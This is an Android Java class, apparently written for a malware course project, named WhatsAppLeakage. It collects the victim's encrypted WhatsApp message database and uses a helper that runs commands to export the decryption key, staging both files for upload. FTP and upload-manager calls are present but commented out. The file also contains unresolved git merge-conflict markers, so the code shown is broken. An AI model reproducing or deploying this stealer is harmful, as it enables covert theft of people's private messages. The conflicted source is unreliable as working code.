package com.malwareclass.malwareproject;

import android.content.Context;
import android.util.Log;

import java.io.File;

public class WhatsAppLeakage {

    private static final String TAG = "WHATSAPP";
    private static String cacheDirPath = null;


    public File[] leak(Context context) {
        Log.d(TAG, "Started");
        File file = new File("/sdcard/WhatsApp/Databases/msgstore.db.crypt12");
        cacheDirPath = context.getCacheDir().getAbsolutePath();

<<<<<<< HEAD

        // upload key and database
        ExportCryptKey exp = new ExportCryptKey();
        exp.getCommandsToExecute();

        //if (checkRootPermission()) {
        if(!exp.execute()) {
            File key = new File(context.getCacheDir(), "key.txt");
            File[] files = new File[2];
            files[0] = file;
            files[1] = key;

            return files;
        }
        else{ //upload database
            File[] files = new File[1];
            files[0] = file;

            return files;
        }

        //new FTP(context).upload(files, "locations");
        /*
        if(UploadData.getIstance(context).addFile("whatsapp", files))
            Log.d(TAG, "Whatsapp data added!");
            */
=======
        //upload database
        File[] files = new File[1];
        files[0] = file;

        return files;

>>>>>>> 327012b795ce8ad3f3bce7d67e82268b67b3350a
    }

}



